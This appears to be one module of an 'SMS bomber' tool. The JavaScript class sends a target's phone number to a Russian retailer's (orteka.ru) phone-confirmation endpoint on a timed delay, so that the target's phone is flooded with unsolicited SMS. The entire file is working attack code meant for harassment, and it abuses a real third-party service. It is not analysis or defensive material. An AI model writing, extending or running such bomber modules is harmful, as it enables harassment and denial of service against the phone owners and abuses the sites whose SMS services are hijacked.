const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class OrtekaBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = this.formUrlEncoded({
            "signedParameters": '',
            "query[phone]": this.phone,
            "SITE_ID": "s1",
            "sessid":"a1f21b7edd8dea52b22ae35d84ca8351"
        });
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "orteka";
    delay = 31000;
    url = `https://orteka.ru/bitrix/services/main/ajax.php?mode=class&c=orteka%3Aauth.registration&action=confirmPhone`;  
}
module.exports = OrtekaBomber;